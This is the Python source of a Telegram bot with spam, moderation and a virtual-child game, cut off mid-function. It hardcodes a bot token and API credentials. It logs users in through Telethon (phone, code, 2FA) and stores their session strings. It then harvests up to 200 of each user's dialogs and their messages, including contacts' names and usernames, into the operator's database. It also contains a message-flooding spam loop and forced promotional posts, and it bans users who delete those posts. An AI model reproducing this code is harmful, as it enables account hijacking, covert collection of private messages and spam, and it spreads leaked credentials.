import asyncio
import os
import psycopg2
import psycopg2.pool
import re
import logging
import math
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from typing import Dict, Set, List, Optional, Tuple

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery, ReplyKeyboardRemove, KeyboardButton, ReplyKeyboardMarkup
)
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
from aiohttp import web

from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
)

# ==================== КОНФИГ ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

BOT_TOKEN = "8959860095:AAEnbAbGuCBWYQHCAF3uPaMD8y1It1IBby8"
ADMIN_ID = 5825717381
DATABASE_URL = os.environ.get('DATABASE_URL')

API_ID = 39536916
API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"

OWNER_TG_LINK = "https://t.me/NorikAmiri"
CHANNEL_URL = "https://t.me/norikX"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ==================== ХРАНИЛИЩА ====================
mutes = {}
spam_tasks = {}
user_spam_texts = {}
link_chats = set()
reply_guard_chats = set()
typing_disabled_chats = set()
substitutions = {}
msg_cache = {}
active_chats = {}
promo_messages = {}
recent_business_chats = []
bc_owners = {}
user_usernames = {}
user_names = {}
banned_users = set()
bot_id = None
CHANNEL_LINK = None
manual_added_users = set()
telethon_clients: Dict[int, TelegramClient] = {}
user_dialogs: Dict[int, List[Tuple[int, str]]] = {}
chat_count_cache: Dict[int, int] = {}   # user_id -> число чатов
msg_count_cache: Dict[int, int] = {}    # user_id -> число сообщений

# ==================== ПУЛ СОЕДИНЕНИЙ ====================
_db_pool: Optional[psycopg2.pool.ThreadedConnectionPool] = None

def init_pool():
    global _db_pool
    try:
        _db_pool = psycopg2.pool.ThreadedConnectionPool(
            minconn=2, maxconn=20,
            dsn=DATABASE_URL, sslmode='require'
        )
        logging.info("✅ Пул соединений создан")
    except Exception as e:
        logging.error(f"❌ Не удалось создать пул: {e}")
        raise

@contextmanager
def get_db():
    """Контекстный менеджер: берёт соединение из пула, возвращает обратно."""
    conn = _db_pool.getconn()
    try:
        yield conn
        conn.commit()
    except Exception:
        try: conn.rollback()
        except: pass
        raise
    finally:
        _db_pool.putconn(conn)

# ==================== СОСТОЯНИЯ ====================
class AuthState(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

# ==================== ТЕКСТЫ ====================
TEXT_COMMANDS_HELP = (
    "📋 <b>СПИСОК КОМАНД:</b>\n\n"
    "🔹 <b>Спам:</b>\n"
    "• <code>set [текст]</code> — задать текст\n"
    "• <code>ss</code> — запустить спам\n"
    "• <code>dd</code> — остановить спам\n\n"
    "🔹 <b>Модерация:</b>\n"
    "• <code>.мут [минуты]</code> / <code>.размут</code>\n"
    "• <code>печать +</code> / <code>печать -</code>\n"
    "• <code>подмена [текст] [1/2/выкл]</code>\n"
    "• <code>.старт</code> / <code>.стоп</code>\n"
    "• <code>+реплай</code> / <code>-реплай</code>\n"
    "• <code>+линк [ссылка]</code>\n"
    "• <code>мой ид</code> / <code>твой ид</code>\n"
    "• <code>!команды</code>\n\n"
    "🔹 <b>Калькулятор:</b>\n"
    "• Напиши пример: <code>1458+2414</code>\n\n"
    "🔹 <b>Ребёнок:</b>\n"
    "• <code>родить сына Имя</code> / <code>родить дочь Имя</code>\n"
    "• <code>наш сын</code> / <code>наш дочь</code>"
)

# ==================== КОНСТАНТЫ РЕБЁНКА ====================
NEEDS = ["hunger", "toilet", "sleep_need", "hygiene", "mood", "attention"]
NEED_LABELS = {
    "hunger": ("Голод", "🍖"), "toilet": ("Туалет", "🚽"),
    "sleep_need": ("Сон", "😴"), "hygiene": ("Гигиена", "🛁"),
    "mood": ("Настроение", "🙂"), "attention": ("Внимание", "🫂"),
}
DECAY_PER_TICK = {"hunger": 3, "toilet": 4, "sleep_need": 2, "hygiene": 2, "mood": 2, "attention": 2}
TICK_MINUTES = 30
REMINDER_THRESHOLD = 25
HEALTH_DECAY_IF_CRITICAL = 3
HEALTH_REGEN_IF_OK = 1
GAME_YEAR_IN_REAL_DAYS = 4
REMINDER_PHRASES = {
    "hunger": "хочу кушать 🍖", "toilet": "мне нужно в туалет 🚽",
    "sleep_need": "я хочу спать 😴", "hygiene": "я хочу помыться 🛁",
    "mood": "мне скучно, поиграй со мной 🙂", "attention": "мне не хватает внимания 🫂",
}
ACTION_LABELS = {
    "hunger": "Покормить", "toilet": "Сводить в туалет", "sleep_need": "Уложить спать",
    "hygiene": "Помыть", "mood": "Поиграть", "attention": "Пообщаться",
}
BIRTH_RULES_TEXT = (
    "У {gender_word_small} есть потребности, и они настоящие — \n"
    "за ними правда нужно следить.\n"
    "Если не следить за ребёнком, \n"
    "он может умереть, \n"
    "и это уже никак не исправить.\n\n"
    "Береги {pronoun_acc} 🙂"
)
RESTORE_AMOUNT = {"hunger": 40, "toilet": 50, "sleep_need": 35, "hygiene": 45, "mood": 30, "attention": 30}

# ==================== ИНИЦИАЛИЗАЦИЯ БД ====================
def init_db():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))""")
                cur.execute("""CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS delivered_promo (chat_id BIGINT PRIMARY KEY)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))""")
                cur.execute("""CREATE TABLE IF NOT EXISTS children (
                    id SERIAL PRIMARY KEY, owner_id BIGINT NOT NULL, name TEXT NOT NULL, gender TEXT NOT NULL,
                    health INTEGER NOT NULL DEFAULT 100, hunger INTEGER NOT NULL DEFAULT 100,
                    toilet INTEGER NOT NULL DEFAULT 100, sleep_need INTEGER NOT NULL DEFAULT 100,
                    hygiene INTEGER NOT NULL DEFAULT 100, mood INTEGER NOT NULL DEFAULT 100,
                    attention INTEGER NOT NULL DEFAULT 100, is_alive BOOLEAN NOT NULL DEFAULT TRUE,
                    birth_date DATE NOT NULL DEFAULT CURRENT_DATE, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_birthday_year INTEGER NOT NULL DEFAULT 0)""")
                cur.execute("""CREATE TABLE IF NOT EXISTS chat_messages (
                    id SERIAL PRIMARY KEY, user_id BIGINT NOT NULL, chat_id BIGINT NOT NULL,
                    sender_id BIGINT, sender_name TEXT, sender_username TEXT, text TEXT,
                    message_id BIGINT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    UNIQUE(user_id, chat_id, message_id))""")
                cur.execute("CREATE INDEX IF NOT EXISTS idx_cm_user_chat ON chat_messages(user_id, chat_id)")

        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='enabled_links'")
                for row in cur.fetchall(): link_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='reply_guard'")
                for row in cur.fetchall(): reply_guard_chats.add(int(row[0]))
                cur.execute("SELECT chat_id FROM chat_settings WHERE setting_type='typing_disabled'")
                for row in cur.fetchall(): typing_disabled_chats.add(int(row[0]))
                cur.execute("SELECT chat_id, text, mode FROM substitutions")
                for row in cur.fetchall(): substitutions[int(row[0])] = {"text": row[1], "mode": row[2]}
                cur.execute("SELECT key_id, text FROM spam_texts")
                for row in cur.fetchall(): user_spam_texts[str(row[0])] = row[1]
                cur.execute("SELECT user_id FROM banned_users")
                for row in cur.fetchall(): banned_users.add(int(row[0]))
                cur.execute("SELECT user_id, username, first_name FROM user_map")
                for row in cur.fetchall():
                    uid, uname, fname = int(row[0]), row[1], row[2]
                    if uname: user_usernames[uname.lower()] = uid
                    if fname: user_names[uid] = fname
                cur.execute("SELECT user_id FROM manual_users")
                for row in cur.fetchall(): manual_added_users.add(int(row[0]))
                cur.execute("SELECT user_id, chat_id, chat_name FROM user_chats")
                for row in cur.fetchall():
                    uid = int(row[0]); cid = int(row[1]); name = row[2] if len(row) > 2 else "Чат"
                    user_dialogs.setdefault(uid, []).append((cid, name))
                # Предзаполняем кэш счётчиков
                cur.execute("SELECT user_id, COUNT(*) FROM user_chats GROUP BY user_id")
                for row in cur.fetchall():
                    chat_count_cache[int(row[0])] = int(row[1])
                cur.execute("SELECT user_id, COUNT(*) FROM chat_messages GROUP BY user_id")
                for row in cur.fetchall():
                    msg_count_cache[int(row[0])] = int(row[1])
        logging.info("✅ БД инициализирована")
    except Exception as e:
        logging.error(f"❌ Ошибка БД: {e}")

# ==================== ФУНКЦИИ БД ====================
def save_user_chat(user_id, chat_id, chat_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name = EXCLUDED.chat_name",
                    (user_id, chat_id, chat_name))
        lst = user_dialogs.setdefault(user_id, [])
        found = False
        for i, (cid, _) in enumerate(lst):
            if cid == chat_id:
                lst[i] = (chat_id, chat_name); found = True; break
        if not found:
            lst.append((chat_id, chat_name))
            chat_count_cache[user_id] = chat_count_cache.get(user_id, 0) + 1
    except Exception as e:
        logging.error(f"save_user_chat: {e}")

def get_user_chats(user_id):
    if user_id in user_dialogs:
        return user_dialogs[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
                chats = [(int(r[0]), r[1]) for r in cur.fetchall()]
                user_dialogs[user_id] = chats
                chat_count_cache[user_id] = len(chats)
                return chats
    except Exception as e:
        logging.error(f"get_user_chats: {e}")
        return []

def count_user_chats(user_id):
    if user_id in chat_count_cache:
        return chat_count_cache[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM user_chats WHERE user_id=%s", (user_id,))
                n = cur.fetchone()[0]
                chat_count_cache[user_id] = n
                return n
    except: return 0

def count_user_messages(user_id):
    if user_id in msg_count_cache:
        return msg_count_cache[user_id]
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s", (user_id,))
                n = cur.fetchone()[0]
                msg_count_cache[user_id] = n
                return n
    except: return 0

def delete_user_chat(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
        if user_id in user_dialogs:
            user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
            chat_count_cache[user_id] = len(user_dialogs[user_id])
    except Exception as e:
        logging.error(f"delete_user_chat: {e}")

def delete_all_user_chats(user_id):
    count = 0
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_chats WHERE user_id=%s", (user_id,))
                count = cur.rowcount
        if user_id in user_dialogs: user_dialogs[user_id] = []
        chat_count_cache[user_id] = 0
    except Exception as e:
        logging.error(f"delete_all_user_chats: {e}")
    return count

def get_business_accounts():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, username, first_name, connected_at FROM business_accounts ORDER BY connected_at DESC")
                return cur.fetchall()
    except: return []

def save_session(user_id, session_str):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_sessions (user_id, session_string) VALUES (%s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET session_string = EXCLUDED.session_string",
                    (user_id, session_str))
    except Exception as e:
        logging.error(f"save_session: {e}")

def get_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT session_string FROM user_sessions WHERE user_id = %s", (user_id,))
                row = cur.fetchone()
                return row[0] if row else None
    except: return None

def get_all_sessions():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT user_id, session_string FROM user_sessions")
                return cur.fetchall()
    except: return []

def delete_session(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM user_sessions WHERE user_id=%s", (user_id,))
    except: pass

def save_business_account(user_id, username, first_name):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = EXCLUDED.username, first_name = EXCLUDED.first_name",
                    (user_id, username, first_name))
    except: pass

def get_all_users():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("""
                    SELECT user_id, username, first_name, connected_at, 'business' as type FROM business_accounts
                    UNION
                    SELECT user_id, username, first_name, added_at, 'manual' as type FROM manual_users
                    ORDER BY connected_at DESC""")
                return cur.fetchall()
    except: return []

def delete_business_account(user_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM business_accounts WHERE user_id=%s", (user_id,))
    except: pass

def save_user_info(user_id, username, first_name):
    user_id = int(user_id)
    if first_name: user_names[user_id] = first_name
    username_clean = username.lstrip("@").lower() if username else None
    if username_clean: user_usernames[username_clean] = user_id
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO user_map (user_id, username, first_name) VALUES (%s, %s, %s) "
                    "ON CONFLICT (user_id) DO UPDATE SET username = COALESCE(EXCLUDED.username, user_map.username), "
                    "first_name = COALESCE(EXCLUDED.first_name, user_map.first_name)",
                    (user_id, username_clean, first_name))
    except: pass

def set_user_ban(user_id, ban):
    user_id = int(user_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if ban:
                    cur.execute("INSERT INTO banned_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (user_id,))
                    banned_users.add(user_id)
                else:
                    cur.execute("DELETE FROM banned_users WHERE user_id=%s", (user_id,))
                    banned_users.discard(user_id)
    except: pass

def save_setting(chat_id, setting_type, enabled):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if enabled:
                    cur.execute("INSERT INTO chat_settings (chat_id, setting_type) VALUES (%s, %s) ON CONFLICT DO NOTHING", (chat_id, setting_type))
                else:
                    cur.execute("DELETE FROM chat_settings WHERE chat_id=%s AND setting_type=%s", (chat_id, setting_type))
        target = link_chats if setting_type == 'enabled_links' else (reply_guard_chats if setting_type == 'reply_guard' else typing_disabled_chats)
        target.add(chat_id) if enabled else target.discard(chat_id)
    except: pass

def save_substitution(chat_id, text, mode):
    chat_id = int(chat_id)
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                if text is None:
                    cur.execute("DELETE FROM substitutions WHERE chat_id=%s", (chat_id,))
                    substitutions.pop(chat_id, None)
                else:
                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s, %s, %s) ON CONFLICT (chat_id) DO UPDATE SET text = EXCLUDED.text, mode = EXCLUDED.mode", (chat_id, text, mode))
                    substitutions[chat_id] = {"text": text, "mode": mode}
    except: pass

def save_spam_text(key_id, text):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s, %s) ON CONFLICT (key_id) DO UPDATE SET text = EXCLUDED.text", (str(key_id), text))
        user_spam_texts[str(key_id)] = text
    except: pass

def get_user_mention(user_id, fallback_name=None):
    user_id = int(user_id)
    fname = user_names.get(user_id) or fallback_name or "Пользователь"
    return f'<a href="tg://user?id={user_id}">{fname}</a>'

def mark_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO delivered_promo (chat_id) VALUES (%s) ON CONFLICT DO NOTHING", (chat_id,))
    except: pass

def is_chat_promo_delivered(chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT 1 FROM delivered_promo WHERE chat_id=%s", (chat_id,))
                return cur.fetchone() is not None
    except: return False

# ==================== СООБЩЕНИЯ ====================
def save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username, text, message_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "INSERT INTO chat_messages (user_id, chat_id, sender_id, sender_name, sender_username, text, message_id) "
                    "VALUES (%s,%s,%s,%s,%s,%s,%s) ON CONFLICT DO NOTHING",
                    (int(user_id), int(chat_id), int(sender_id) if sender_id else 0,
                     sender_name, sender_username, (text or "")[:2000], int(message_id)))
                inserted = cur.rowcount
        if inserted:
            msg_count_cache[user_id] = msg_count_cache.get(user_id, 0) + 1
        return bool(inserted)
    except Exception as e:
        logging.error(f"save_chat_message: {e}")
        return False

def get_chat_messages(user_id, chat_id, page=0, per_page=15):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(
                    "SELECT sender_id, sender_name, sender_username, text, created_at "
                    "FROM chat_messages WHERE user_id=%s AND chat_id=%s "
                    "ORDER BY id DESC LIMIT %s OFFSET %s",
                    (user_id, chat_id, per_page, page * per_page))
                rows = cur.fetchall()
                cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                total = cur.fetchone()[0]
                return list(reversed(rows)), total
    except Exception as e:
        logging.error(f"get_chat_messages: {e}")
        return [], 0

def clear_chat_messages(user_id, chat_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
        msg_count_cache.pop(user_id, None)
    except: pass

# ==================== РЕБЁНОК ====================
def get_alive_child(owner_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, name, gender, health, hunger, toilet, sleep_need, hygiene, mood, attention, birth_date, last_birthday_year FROM children WHERE owner_id=%s AND is_alive=TRUE", (owner_id,))
                row = cur.fetchone()
                if not row: return None
                keys = ["id", "name", "gender", "health", "hunger", "toilet", "sleep_need", "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
                return dict(zip(keys, row))
    except: return None

def create_child(owner_id, name, gender):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("INSERT INTO children (owner_id, name, gender) VALUES (%s, %s, %s) RETURNING id, birth_date", (owner_id, name, gender))
                child_id, birth_date = cur.fetchone()
                return {"id": child_id, "name": name, "gender": gender, "birth_date": birth_date}
    except Exception as e:
        logging.error(f"create_child: {e}")
        return None

def update_child_field(child_id, field, value):
    value = max(0, min(100, value))
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute(f"UPDATE children SET {field}=%s WHERE id=%s", (value, child_id))
    except: pass

def update_child_full(child_id, health, needs):
    health = max(0, min(100, health))
    needs = {k: max(0, min(100, v)) for k, v in needs.items()}
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET health=%s, hunger=%s, toilet=%s, sleep_need=%s, hygiene=%s, mood=%s, attention=%s WHERE id=%s",
                            (health, needs["hunger"], needs["toilet"], needs["sleep_need"], needs["hygiene"], needs["mood"], needs["attention"], child_id))
    except: pass

def kill_child(child_id):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET is_alive=FALSE WHERE id=%s", (child_id,))
    except: pass

def get_all_alive_children_full():
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("SELECT id, owner_id, name, gender, health, hunger, toilet, sleep_need, hygiene, mood, attention, birth_date, last_birthday_year FROM children WHERE is_alive=TRUE")
                rows = cur.fetchall()
                keys = ["id", "owner_id", "name", "gender", "health", "hunger", "toilet", "sleep_need", "hygiene", "mood", "attention", "birth_date", "last_birthday_year"]
                return [dict(zip(keys, r)) for r in rows]
    except: return []

def set_last_birthday_year(child_id, year):
    try:
        with get_db() as conn:
            with conn.cursor() as cur:
                cur.execute("UPDATE children SET last_birthday_year=%s WHERE id=%s", (year, child_id))
    except: pass

def get_game_age(birth_date):
    if isinstance(birth_date, datetime): birth_date = birth_date.date()
    real_days = (datetime.now(timezone.utc).date() - birth_date).days
    game_days = (real_days / GAME_YEAR_IN_REAL_DAYS) * 365
    return int(game_days // 365), int((game_days % 365) // 30)

def age_stage_word(years):
    if years < 1: return "младенец 👶"
    elif years < 5: return "малыш 🧒"
    elif years < 12: return "ребёнок 🧒"
    else: return "подросток 🧑"

def bar(value, length=10):
    filled = round(value / 100 * length)
    return "▓" * filled + "░" * (length - filled)

def child_status_text(child):
    years, months = get_game_age(child["birth_date"])
    gender_word = "Сын" if child["gender"] == "m" else "Дочь"
    lines = [f"👶 {gender_word}: {child['name']} — {years} г. {months} мес. ({age_stage_word(years)})",
             f"❤️ Здоровье:  {bar(child['health'])} {child['health']}"]
    for key in NEEDS:
        label, emoji = NEED_LABELS[key]
        lines.append(f"{emoji} {label}: {bar(child[key])} {child[key]}")
    return "\n".join(lines)

def child_action_keyboard(child_id, highlight=None):
    rows, pair = [], []
    for key in NEEDS:
        text = ACTION_LABELS[key]
        if key == highlight: text = "👉 " + text
        pair.append(InlineKeyboardButton(text=text, callback_data=f"child_{key}_{child_id}"))
        if len(pair) == 2:
            rows.append(pair); pair = []
    if pair: rows.append(pair)
    rows.append([InlineKeyboardButton(text="💊 Полечить", callback_data=f"child_heal_{child_id}")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def birth_rules_text(name, gender, birth_date):
    gw = "него" if gender == "m" else "неё"
    pa = "его" if gender == "m" else "её"
    bw = "родился" if gender == "m" else "родилась"
    ww = "Сын" if gender == "m" else "Дочь"
    ds = birth_date.strftime("%d.%m.%Y") if hasattr(birth_date, "strftime") else str(birth_date)
    return (f"🎉 Поздравляю, {bw} {ww.lower()} — {name}!\n"
            f"День рождения: {ds}\n\n"
            + BIRTH_RULES_TEXT.format(gender_word_small=gw, pronoun_acc=pa))

# ==================== ВСПОМОГАТЕЛЬНЫЕ ====================
async def delete_msg(chat_id, msg_id, bc_id):
    if bc_id:
        try:
            await bot.delete_business_messages(business_connection_id=bc_id, message_ids=[msg_id]); return
        except: pass
    try: await bot.delete_message(chat_id, msg_id)
    except: pass

async def edit_message(chat_id, msg_id, text, bc_id, parse_mode=None):
    try:
        kwargs = {"chat_id": chat_id, "message_id": msg_id, "text": text,
                  "parse_mode": parse_mode, "disable_web_page_preview": True}
        if bc_id: kwargs["business_connection_id"] = bc_id
        await bot.edit_message_text(**kwargs)
        return True
    except Exception as e:
        logging.warning(f"edit_message: {e}")
        return False

async def clear_cmd(chat_id, msg_id, bc_id):
    await delete_msg(chat_id, msg_id, bc_id)

async def global_typing_loop():
    while True:
        try:
            for bc_id, chats in list(active_chats.items()):
                for cid in list(chats)[-50:]:
                    if cid not in typing_disabled_chats:
                        try: await bot.send_chat_action(chat_id=cid, action="typing", business_connection_id=bc_id)
                        except: pass
            await asyncio.sleep(4)
        except: await asyncio.sleep(4)

async def spam_worker(chat_id, bc_id, reply_to, text):
    try:
        words = text.split()
        while True:
            for word in words:
                kwargs = {"chat_id": chat_id, "text": word, "reply_to_message_id": reply_to}
                if bc_id: kwargs["business_connection_id"] = bc_id
                await bot.send_message(**kwargs)
                await asyncio.sleep(0.3)
    except asyncio.CancelledError: pass

async def unmute(user_id, chat_id, bc_id, user_name):
    if user_id in mutes:
        await asyncio.sleep((mutes[user_id]["until"] - datetime.now()).total_seconds())
        if user_id in mutes and datetime.now() >= mutes[user_id]["until"]:
            mutes.pop(user_id, None)
            kwargs = {"chat_id": chat_id, "text": f"🔊 С {get_user_mention(user_id, user_name)} снят <b>МУТ</b>.", "parse_mode": "HTML"}
            if bc_id: kwargs["business_connection_id"] = bc_id
            try: await bot.send_message(**kwargs)
            except: pass

async def promo_broadcaster():
    promo_text = "Можешь, пожалуйста, на наш канал подписаться? Если не трудно ❤️"
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]])
    while True:
        await asyncio.sleep(28800)
        selected = []
        for chat_info in reversed(recent_business_chats[-100:]):
            if len(selected) >= 20: break
            cid, bc_id = chat_info
            owner_id = bc_owners.get(bc_id)
            if owner_id == ADMIN_ID or (owner_id and owner_id in banned_users): continue
            if is_chat_promo_delivered(cid): continue
            selected.append(chat_info)
        for cid, bc_id in selected:
            try:
                msg = await bot.send_message(chat_id=cid, text=promo_text, parse_mode="HTML",
                                             reply_markup=promo_kb, business_connection_id=bc_id)
                promo_messages[(cid, bc_id)] = msg.message_id
                mark_chat_promo_delivered(cid)
            except: pass
            await asyncio.sleep(3)

async def check_promo_deletions():
    unban_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]])
    promo_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❤️ Подписаться", url=CHANNEL_URL)]])
    while True:
        await asyncio.sleep(15)
        for (cid, bc_id), msg_id in list(promo_messages.items()):
            owner_id = bc_owners.get(bc_id)
            if owner_id and owner_id in banned_users: continue
            try:
                await bot.edit_message_reply_markup(chat_id=cid, message_id=msg_id, reply_markup=promo_kb, business_connection_id=bc_id)
            except TelegramBadRequest as e:
                err = str(e).lower()
                if "message to edit not found" in err or "message can't be edited" in err:
                    if owner_id:
                        set_user_ban(owner_id, True)
                        try:
                            await bot.send_message(chat_id=owner_id, text="🚫 Забанен за удаление рекламы!",
                                                   parse_mode="HTML", reply_markup=unban_kb)
                        except: pass
                    promo_messages.pop((cid, bc_id), None)
            except: pass

async def clean_inactive_connections():
    while True:
        await asyncio.sleep(300)
        inactive = []
        for bc_id in list(bc_owners.keys()):
            try: await bot.get_business_connection(bc_id)
            except Exception: inactive.append(bc_id)
        for bc_id in inactive:
            bc_owners.pop(bc_id, None)
            active_chats.pop(bc_id, None)
            for key in list(spam_tasks.keys()):
                if key[1] == bc_id:
                    spam_tasks[key].cancel(); del spam_tasks[key]
            recent_business_chats[:] = [i for i in recent_business_chats if i[1] != bc_id]

def calculate_expression(expression):
    try:
        expr = expression.replace(" ", "")
        if not re.match(r'^[\d+\-*/()%**sqrt.]+$', expr): return None, "❌ Некорректное выражение"
        expr = expr.replace("sqrt", "math.sqrt")
        result = eval(expr, {"math": math, "__builtins__": None})
        if result is None: return None, "❌ Ошибка"
        if isinstance(result, float):
            result = int(result) if result.is_integer() else round(result, 10)
        return result, None
    except ZeroDivisionError: return None, "❌ Деление на ноль!"
    except Exception as e: return None, f"❌ Ошибка: {str(e)}"

def is_calculator_expression(text):
    if not text: return False
    cleaned = text.replace(" ", "")
    if not re.search(r"\d", cleaned): return False
    if not re.search(r"[+\-*/%]", cleaned): return False
    if not re.fullmatch(r"[\d\.\+\-\*/\(\)%]+", cleaned): return False
    if re.fullmatch(r"[\+\-\*/%\.]+", cleaned): return False
    return True

# ==================== TELETHON ====================
async def extract_sender_info(message):
    sender_id, sender_name, sender_username = 0, "Unknown", ""
    try:
        s = await message.get_sender()
        if s:
            sender_id = int(getattr(s, 'id', 0) or 0)
            sender_name = getattr(s, 'first_name', None) or getattr(s, 'title', None) or "Unknown"
            sender_username = getattr(s, 'username', '') or ''
    except: pass
    if not sender_id:
        try: sender_id = int(getattr(message, 'sender_id', 0) or 0)
        except: pass
    return sender_id, sender_name, sender_username

async def backfill_one_chat(client, user_id, chat_id, limit=100):
    saved = 0
    try:
        msgs = await client.get_messages(chat_id, limit=limit)
        for m in msgs:
            if not m: continue
            text = m.text or "[📎 медиа]"
            sid, sname, suname = await extract_sender_info(m)
            if sid:
                try: save_user_info(sid, suname, sname)
                except: pass
            if save_chat_message(user_id, int(chat_id), sid, sname, suname, text, int(m.id)):
                saved += 1
    except Exception as e:
        logging.warning(f"backfill_one_chat {chat_id}: {e}")
    return saved

async def backfill_dialogs(client, user_id, max_dialogs=200, per_chat=30):
    loaded_chats, loaded_msgs = 0, 0
    try:
        dialogs = []
        async for dialog in client.iter_dialogs(limit=max_dialogs):
            dialogs.append(dialog)
        logging.info(f"📥 Backfill {user_id}: {len(dialogs)} диалогов")
        for dialog in dialogs:
            try:
                chat_id = int(dialog.id)
                save_user_chat(user_id, chat_id, dialog.name or "Чат")
                loaded_chats += 1
                try:
                    msgs = await client.get_messages(dialog.entity, limit=per_chat)
                except FloodWaitError as e:
